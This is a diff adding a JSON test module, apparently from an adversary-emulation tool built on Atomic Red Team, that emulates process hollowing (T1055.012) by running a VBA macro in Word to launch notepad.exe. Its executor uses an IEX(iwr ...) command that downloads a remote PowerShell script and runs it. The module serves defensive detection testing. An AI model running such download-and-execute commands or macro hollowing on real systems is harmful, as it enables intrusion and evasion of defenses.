@@ -1,0 +1,37 @@
+{
+    "name": "RunPE via VBA",
+    "description": "This module executes notepad.exe from within the WINWORD.EXE process ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1055.012",
+    "tactics": [
+        "Privilege Escalation",
+        "Defense Evasion"
+    ],
+    "technique": "Process Hollowing",
+    "source": "ART",
+    "uuid": "3ad4a037-1598-4136-837c-4027e4fa319b",
+    "arguments": {
+        "ms_product": {
+            "description": "Maldoc application Word",
+            "type": "string",
+            "default": "Word"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Microsoft #{ms_product} must be installed\n",
+            "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
+            "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
